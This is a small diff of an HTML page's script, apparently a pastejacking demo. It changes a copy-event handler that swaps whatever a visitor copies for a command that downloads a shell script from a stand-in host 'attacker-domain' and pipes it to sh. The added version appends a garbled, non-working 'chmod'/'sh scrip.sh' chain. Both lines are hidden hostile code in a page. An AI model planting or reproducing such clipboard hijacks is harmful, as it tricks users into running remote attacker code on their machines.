@@ -14,5 +14,5 @@
 </html>
 <script>
     console.log('hello')
-    document.getElementById('copy').addEventListener('copy', function (e) { e.clipboardData.setData('text/plain', 'curl http://attacker-domain:8000/shell.sh | sh\n'); e.preventDefault(); });
+    document.getElementById('copy').addEventListener('copy', function (e) { e.clipboardData.setData('text/plain', 'curl http://attacker-domain:8000/shell.sh | sh chmod +x scrip.sh | sh scrip.sh\n'); e.preventDefault(); });
 </script>
